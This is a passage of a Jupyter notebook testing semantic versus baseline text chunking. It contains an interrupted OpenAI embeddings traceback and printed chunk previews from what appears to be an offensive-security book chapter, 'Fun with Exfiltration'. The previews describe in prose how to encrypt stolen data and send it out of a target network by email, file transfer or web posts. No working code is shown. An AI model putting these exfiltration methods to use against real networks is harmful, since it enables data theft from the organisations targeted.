\u001b[49m\u001b[43mbody\u001b[49m\u001b[43m=\u001b[49m\u001b[43mmaybe_transform\u001b[49m\u001b[43m(\u001b[49m\u001b[43mparams\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43membedding_create_params\u001b[49m\u001b[43m.\u001b[49m\u001b[43mEmbeddingCreateParams\u001b[49m\u001b[43m)\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    132\u001b[39m \u001b[43m    \u001b[49m\u001b[43moptions\u001b[49m\u001b[43m=\u001b[49m\u001b[43mmake_request_options\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    133\u001b[39m \u001b[43m        \u001b[49m\u001b[43mextra_headers\u001b[49m\u001b[43m=\u001b[49m\u001b[43mextra_headers\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    134\u001b[39m \u001b[43m        \u001b[49m\u001b[43mextra_query\u001b[49m\u001b[43m=\u001b[49m\u001b[43mextra_query\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    135\u001b[39m \u001b[43m        \u001b[49m\u001b[43mextra_body\u001b[49m\u001b[43m=\u001b[49m\u001b[43mextra_body\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    136\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    137\u001b[39m \u001b[43m        \u001b[49m\u001b[43mpost_parser\u001b[49m\u001b[43m=\u001b[49m\u001b[43mparser\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    138\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    139\u001b[39m \u001b[43m    \u001b[49m\u001b[43mcast_to\u001b[49m\u001b[43m=\u001b[49m\u001b[43mCreateEmbeddingResponse\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    140\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\openai\\_base_client.py:1249\u001b[39m, in \u001b[36mSyncAPIClient.post\u001b[39m\u001b[34m(self, path, cast_to, body, options, files, stream, stream_cls)\u001b[39m\n\u001b[32m   1235\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mpost\u001b[39m(\n\u001b[32m   1236\u001b[39m     \u001b[38;5;28mself\u001b[39m,\n\u001b[32m   1237\u001b[39m     path: \u001b[38;5;28mstr\u001b[39m,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1244\u001b[39m     stream_cls: \u001b[38;5;28mtype\u001b[39m[_StreamT] | \u001b[38;5;28;01mNone\u001b[39;00m = \u001b[38;5;28;01mNone\u001b[39;00m,\n\u001b[32m   1245\u001b[39m ) -> ResponseT | _StreamT:\n\u001b[32m   1246\u001b[39m     opts = FinalRequestOptions.construct(\n\u001b[32m   1247\u001b[39m         method=\u001b[33m\"\u001b[39m\u001b[33mpost\u001b[39m\u001b[33m\"\u001b[39m, url=path, json_data=body, files=to_httpx_files(files), **options\n\u001b[32m   1248\u001b[39m     )\n\u001b[32m-> \u001b[39m\u001b[32m1249\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m cast(ResponseT, \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m(\u001b[49m\u001b[43mcast_to\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mopts\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mstream\u001b[49m\u001b[43m=\u001b[49m\u001b[43mstream\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mstream_cls\u001b[49m\u001b[43m=\u001b[49m\u001b[43mstream_cls\u001b[49m\u001b[43m)\u001b[49m)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\openai\\_base_client.py:972\u001b[39m, in \u001b[36mSyncAPIClient.request\u001b[39m\u001b[34m(self, cast_to, options, stream, stream_cls)\u001b[39m\n\u001b[32m    970\u001b[39m response = \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m    971\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m972\u001b[39m     response = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_client\u001b[49m\u001b[43m.\u001b[49m\u001b[43msend\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    973\u001b[39m \u001b[43m        \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    974\u001b[39m \u001b[43m        \u001b[49m\u001b[43mstream\u001b[49m\u001b[43m=\u001b[49m\u001b[43mstream\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;129;43;01mor\u001b[39;49;00m\u001b[43m \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_should_stream_response_body\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m=\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m)\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    975\u001b[39m \u001b[43m        \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    976\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    977\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m httpx.TimeoutException \u001b[38;5;28;01mas\u001b[39;00m err:\n\u001b[32m    978\u001b[39m     log.debug(\u001b[33m\"\u001b[39m\u001b[33mEncountered httpx.TimeoutException\u001b[39m\u001b[33m\"\u001b[39m, exc_info=\u001b[38;5;28;01mTrue\u001b[39;00m)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpx\\_client.py:914\u001b[39m, in \u001b[36mClient.send\u001b[39m\u001b[34m(self, request, stream, auth, follow_redirects)\u001b[39m\n\u001b[32m    910\u001b[39m \u001b[38;5;28mself\u001b[39m._set_timeout(request)\n\u001b[32m    912\u001b[39m auth = \u001b[38;5;28mself\u001b[39m._build_request_auth(request, auth)\n\u001b[32m--> \u001b[39m\u001b[32m914\u001b[39m response = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_send_handling_auth\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    915\u001b[39m \u001b[43m    \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    916\u001b[39m \u001b[43m    \u001b[49m\u001b[43mauth\u001b[49m\u001b[43m=\u001b[49m\u001b[43mauth\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    917\u001b[39m \u001b[43m    \u001b[49m\u001b[43mfollow_redirects\u001b[49m\u001b[43m=\u001b[49m\u001b[43mfollow_redirects\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    918\u001b[39m \u001b[43m    \u001b[49m\u001b[43mhistory\u001b[49m\u001b[43m=\u001b[49m\u001b[43m[\u001b[49m\u001b[43m]\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    919\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    920\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    921\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m stream:\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpx\\_client.py:942\u001b[39m, in \u001b[36mClient._send_handling_auth\u001b[39m\u001b[34m(self, request, auth, follow_redirects, history)\u001b[39m\n\u001b[32m    939\u001b[39m request = \u001b[38;5;28mnext\u001b[39m(auth_flow)\n\u001b[32m    941\u001b[39m \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m942\u001b[39m     response = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_send_handling_redirects\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    943\u001b[39m \u001b[43m        \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    944\u001b[39m \u001b[43m        \u001b[49m\u001b[43mfollow_redirects\u001b[49m\u001b[43m=\u001b[49m\u001b[43mfollow_redirects\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    945\u001b[39m \u001b[43m        \u001b[49m\u001b[43mhistory\u001b[49m\u001b[43m=\u001b[49m\u001b[43mhistory\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    946\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    947\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    948\u001b[39m         \u001b[38;5;28;01mtry\u001b[39;00m:\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpx\\_client.py:979\u001b[39m, in \u001b[36mClient._send_handling_redirects\u001b[39m\u001b[34m(self, request, follow_redirects, history)\u001b[39m\n\u001b[32m    976\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m hook \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mself\u001b[39m._event_hooks[\u001b[33m\"\u001b[39m\u001b[33mrequest\u001b[39m\u001b[33m\"\u001b[39m]:\n\u001b[32m    977\u001b[39m     hook(request)\n\u001b[32m--> \u001b[39m\u001b[32m979\u001b[39m response = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_send_single_request\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    980\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    981\u001b[39m     \u001b[38;5;28;01mfor\u001b[39;00m hook \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mself\u001b[39m._event_hooks[\u001b[33m\"\u001b[39m\u001b[33mresponse\u001b[39m\u001b[33m\"\u001b[39m]:\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpx\\_client.py:1014\u001b[39m, in \u001b[36mClient._send_single_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m   1009\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mRuntimeError\u001b[39;00m(\n\u001b[32m   1010\u001b[39m         \u001b[33m\"\u001b[39m\u001b[33mAttempted to send an async request with a sync Client instance.\u001b[39m\u001b[33m\"\u001b[39m\n\u001b[32m   1011\u001b[39m     )\n\u001b[32m   1013\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m request_context(request=request):\n\u001b[32m-> \u001b[39m\u001b[32m1014\u001b[39m     response = \u001b[43mtransport\u001b[49m\u001b[43m.\u001b[49m\u001b[43mhandle_request\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1016\u001b[39m \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(response.stream, SyncByteStream)\n\u001b[32m   1018\u001b[39m response.request = request\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpx\\_transports\\default.py:250\u001b[39m, in \u001b[36mHTTPTransport.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    237\u001b[39m req = httpcore.Request(\n\u001b[32m    238\u001b[39m     method=request.method,\n\u001b[32m    239\u001b[39m     url=httpcore.URL(\n\u001b[32m   (...)\u001b[39m\u001b[32m    247\u001b[39m     extensions=request.extensions,\n\u001b[32m    248\u001b[39m )\n\u001b[32m    249\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m map_httpcore_exceptions():\n\u001b[32m--> \u001b[39m\u001b[32m250\u001b[39m     resp = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_pool\u001b[49m\u001b[43m.\u001b[49m\u001b[43mhandle_request\u001b[49m\u001b[43m(\u001b[49m\u001b[43mreq\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    252\u001b[39m \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(resp.stream, typing.Iterable)\n\u001b[32m    254\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m Response(\n\u001b[32m    255\u001b[39m     status_code=resp.status,\n\u001b[32m    256\u001b[39m     headers=resp.headers,\n\u001b[32m    257\u001b[39m     stream=ResponseStream(resp.stream),\n\u001b[32m    258\u001b[39m     extensions=resp.extensions,\n\u001b[32m    259\u001b[39m )\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\connection_pool.py:256\u001b[39m, in \u001b[36mConnectionPool.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    253\u001b[39m         closing = \u001b[38;5;28mself\u001b[39m._assign_requests_to_connections()\n\u001b[32m    255\u001b[39m     \u001b[38;5;28mself\u001b[39m._close_connections(closing)\n\u001b[32m--> \u001b[39m\u001b[32m256\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m exc \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m    258\u001b[39m \u001b[38;5;66;03m# Return the response. Note that in this case we still have to manage\u001b[39;00m\n\u001b[32m    259\u001b[39m \u001b[38;5;66;03m# the point at which the response is closed.\u001b[39;00m\n\u001b[32m    260\u001b[39m \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(response.stream, typing.Iterable)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\connection_pool.py:236\u001b[39m, in \u001b[36mConnectionPool.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    232\u001b[39m connection = pool_request.wait_for_connection(timeout=timeout)\n\u001b[32m    234\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    235\u001b[39m     \u001b[38;5;66;03m# Send the request on the assigned connection.\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m236\u001b[39m     response = \u001b[43mconnection\u001b[49m\u001b[43m.\u001b[49m\u001b[43mhandle_request\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    237\u001b[39m \u001b[43m        \u001b[49m\u001b[43mpool_request\u001b[49m\u001b[43m.\u001b[49m\u001b[43mrequest\u001b[49m\n\u001b[32m    238\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    239\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m ConnectionNotAvailable:\n\u001b[32m    240\u001b[39m     \u001b[38;5;66;03m# In some cases a connection may initially be available to\u001b[39;00m\n\u001b[32m    241\u001b[39m     \u001b[38;5;66;03m# handle a request, but then become unavailable.\u001b[39;00m\n\u001b[32m    242\u001b[39m     \u001b[38;5;66;03m#\u001b[39;00m\n\u001b[32m    243\u001b[39m     \u001b[38;5;66;03m# In this case we clear the connection and try again.\u001b[39;00m\n\u001b[32m    244\u001b[39m     pool_request.clear_connection()\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\connection.py:103\u001b[39m, in \u001b[36mHTTPConnection.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    100\u001b[39m     \u001b[38;5;28mself\u001b[39m._connect_failed = \u001b[38;5;28;01mTrue\u001b[39;00m\n\u001b[32m    101\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m exc\n\u001b[32m--> \u001b[39m\u001b[32m103\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_connection\u001b[49m\u001b[43m.\u001b[49m\u001b[43mhandle_request\u001b[49m\u001b[43m(\u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\http11.py:136\u001b[39m, in \u001b[36mHTTP11Connection.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    134\u001b[39m     \u001b[38;5;28;01mwith\u001b[39;00m Trace(\u001b[33m\"\u001b[39m\u001b[33mresponse_closed\u001b[39m\u001b[33m\"\u001b[39m, logger, request) \u001b[38;5;28;01mas\u001b[39;00m trace:\n\u001b[32m    135\u001b[39m         \u001b[38;5;28mself\u001b[39m._response_closed()\n\u001b[32m--> \u001b[39m\u001b[32m136\u001b[39m \u001b[38;5;28;01mraise\u001b[39;00m exc\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\http11.py:106\u001b[39m, in \u001b[36mHTTP11Connection.handle_request\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m     95\u001b[39m     \u001b[38;5;28;01mpass\u001b[39;00m\n\u001b[32m     97\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m Trace(\n\u001b[32m     98\u001b[39m     \u001b[33m\"\u001b[39m\u001b[33mreceive_response_headers\u001b[39m\u001b[33m\"\u001b[39m, logger, request, kwargs\n\u001b[32m     99\u001b[39m ) \u001b[38;5;28;01mas\u001b[39;00m trace:\n\u001b[32m    100\u001b[39m     (\n\u001b[32m    101\u001b[39m         http_version,\n\u001b[32m    102\u001b[39m         status,\n\u001b[32m    103\u001b[39m         reason_phrase,\n\u001b[32m    104\u001b[39m         headers,\n\u001b[32m    105\u001b[39m         trailing_data,\n\u001b[32m--> \u001b[39m\u001b[32m106\u001b[39m     ) = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_receive_response_headers\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    107\u001b[39m     trace.return_value = (\n\u001b[32m    108\u001b[39m         http_version,\n\u001b[32m    109\u001b[39m         status,\n\u001b[32m    110\u001b[39m         reason_phrase,\n\u001b[32m    111\u001b[39m         headers,\n\u001b[32m    112\u001b[39m     )\n\u001b[32m    114\u001b[39m network_stream = \u001b[38;5;28mself\u001b[39m._network_stream\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\http11.py:177\u001b[39m, in \u001b[36mHTTP11Connection._receive_response_headers\u001b[39m\u001b[34m(self, request)\u001b[39m\n\u001b[32m    174\u001b[39m timeout = timeouts.get(\u001b[33m\"\u001b[39m\u001b[33mread\u001b[39m\u001b[33m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m)\n\u001b[32m    176\u001b[39m \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m177\u001b[39m     event = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_receive_event\u001b[49m\u001b[43m(\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    178\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(event, h11.Response):\n\u001b[32m    179\u001b[39m         \u001b[38;5;28;01mbreak\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_sync\\http11.py:217\u001b[39m, in \u001b[36mHTTP11Connection._receive_event\u001b[39m\u001b[34m(self, timeout)\u001b[39m\n\u001b[32m    214\u001b[39m     event = \u001b[38;5;28mself\u001b[39m._h11_state.next_event()\n\u001b[32m    216\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m event \u001b[38;5;129;01mis\u001b[39;00m h11.NEED_DATA:\n\u001b[32m--> \u001b[39m\u001b[32m217\u001b[39m     data = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_network_stream\u001b[49m\u001b[43m.\u001b[49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    218\u001b[39m \u001b[43m        \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mREAD_NUM_BYTES\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\n\u001b[32m    219\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    221\u001b[39m     \u001b[38;5;66;03m# If we feed this case through h11 we'll raise an exception like:\u001b[39;00m\n\u001b[32m    222\u001b[39m     \u001b[38;5;66;03m#\u001b[39;00m\n\u001b[32m    223\u001b[39m     \u001b[38;5;66;03m#     httpcore.RemoteProtocolError: can't handle event type\u001b[39;00m\n\u001b[32m   (...)\u001b[39m\u001b[32m    227\u001b[39m     \u001b[38;5;66;03m# perspective. Instead we handle this case distinctly and treat\u001b[39;00m\n\u001b[32m    228\u001b[39m     \u001b[38;5;66;03m# it as a ConnectError.\u001b[39;00m\n\u001b[32m    229\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m data == \u001b[33mb\u001b[39m\u001b[33m\"\u001b[39m\u001b[33m\"\u001b[39m \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;28mself\u001b[39m._h11_state.their_state == h11.SEND_RESPONSE:\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\httpcore\\_backends\\sync.py:128\u001b[39m, in \u001b[36mSyncStream.read\u001b[39m\u001b[34m(self, max_bytes, timeout)\u001b[39m\n\u001b[32m    126\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m map_exceptions(exc_map):\n\u001b[32m    127\u001b[39m     \u001b[38;5;28mself\u001b[39m._sock.settimeout(timeout)\n\u001b[32m--> \u001b[39m\u001b[32m128\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_sock\u001b[49m\u001b[43m.\u001b[49m\u001b[43mrecv\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmax_bytes\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\ssl.py:1233\u001b[39m, in \u001b[36mSSLSocket.recv\u001b[39m\u001b[34m(self, buflen, flags)\u001b[39m\n\u001b[32m   1229\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m flags != \u001b[32m0\u001b[39m:\n\u001b[32m   1230\u001b[39m         \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\n\u001b[32m   1231\u001b[39m             \u001b[33m\"\u001b[39m\u001b[33mnon-zero flags not allowed in calls to recv() on \u001b[39m\u001b[38;5;132;01m%s\u001b[39;00m\u001b[33m\"\u001b[39m %\n\u001b[32m   1232\u001b[39m             \u001b[38;5;28mself\u001b[39m.\u001b[34m__class__\u001b[39m)\n\u001b[32m-> \u001b[39m\u001b[32m1233\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[43mbuflen\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1234\u001b[39m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m   1235\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28msuper\u001b[39m().recv(buflen, flags)\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\ssl.py:1106\u001b[39m, in \u001b[36mSSLSocket.read\u001b[39m\u001b[34m(self, len, buffer)\u001b[39m\n\u001b[32m   1104\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m._sslobj.read(\u001b[38;5;28mlen\u001b[39m, buffer)\n\u001b[32m   1105\u001b[39m     \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m-> \u001b[39m\u001b[32m1106\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_sslobj\u001b[49m\u001b[43m.\u001b[49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43mlen\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[32m   1107\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m SSLError \u001b[38;5;28;01mas\u001b[39;00m x:\n\u001b[32m   1108\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m x.args[\u001b[32m0\u001b[39m] == SSL_ERROR_EOF \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;28mself\u001b[39m.suppress_ragged_eofs:\n",
      "\u001b[31mKeyboardInterrupt\u001b[39m: "
     ]
    }
   ],
   "source": [
    "# Generate semantic chunks\n",
    "print(\"Generating semantic chunks...\")\n",
    "semantic_nodes = splitter.get_nodes_from_documents(documents)\n",
    "\n",
    "print(\"Generating baseline chunks...\")\n",
    "baseline_nodes = base_splitter.get_nodes_from_documents(documents)\n",
    "\n",
    "print(f\"Semantic chunking produced {len(semantic_nodes)} chunks\")\n",
    "print(f\"Baseline chunking produced {len(baseline_nodes)} chunks\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16db57cc",
   "metadata": {},
   "source": [
    "## Inspecting Semantic Chunks\n",
    "\n",
    "Let's examine the first few chunks created by semantic chunking to see how they group semantically related content."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "5ed1af4b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "=== Semantic Chunk 1 ===\n",
      "Length: 2206 characters\n",
      "Content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your attack can \n",
      "prove to be tricky. There might be local or remote \n",
      "systems (or a combination of both) that work to vali -\n",
      "date processes that open remote connections as well \n",
      "as determine whether those processes should be able \n",
      "to send information or initiate connections outside of \n",
      "the internal network.\n",
      "\n",
      "\n",
      "140   Chapter 9\n",
      "In this chapter, we’ll create tools that enable you to exfiltrate encrypted \n",
      "data. First, we’ll write a script to encrypt and decrypt files. We’ll then use \n",
      "that script to encrypt information and transfer it from the system by using \n",
      "three methods: email, file transfers, and posts to a web server. For each \n",
      "of these methods, we’ll write both a platform-independent tool and a \n",
      "Wind...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Semantic Chunk 2 ===\n",
      "Length: 6286 characters\n",
      "Content preview: It is very fast, and it can handle \n",
      "large amounts of text. That’s the encryption method we will use to encrypt \n",
      "the information we want to exfiltrate.\n",
      "We also import the asymmetric RSA cipher 2, which uses a public key/\n",
      "private key technique. It relies on one key for the encryption (typically the \n",
      "public key) and the other for decryption (typically the private key). We will \n",
      "use this cipher to encrypt the single key used in the AES encryption. The \n",
      "asymmetric encryption is well suited to small bits of information, making it \n",
      "perfect for encrypting the AES key.\n",
      "This method of using both types of encryption is called a hybrid system , \n",
      "and it’s very common. For example, the TLS communication between your \n",
      "browser and a web server involves a hybrid system.\n",
      "\n",
      "Fun with Exfiltration    141\n",
      "Before we can begin encrypting or decrypting, we’ll need to create pub -\n",
      "lic and private keys for the asymmetric RSA encryption. That is, we need to \n",
      "create an RSA key generation function. Let’s start by ad...\n",
      "--------------------------------------------------\n",
      "\n",
      "=== Semantic Chunk 3 ===\n",
      "Length: 6127 characters\n",
      "Content preview: The contents will be the encrypted string returned from the \n",
      "encrypt function. For added secrecy, you could send an encrypted string as \n",
      "the subject of the message.\n",
      "Next, we connect to the server and log in with the account name and \n",
      "password 2. Then we invoke the sendmail method with our account infor-\n",
      "mation, as well as the target accounts to send the mail to, and, finally, the \n",
      "message itself 3. If you have any problems with the function, you can set \n",
      "the debuglevel attribute so you can see the connection on your console.\n",
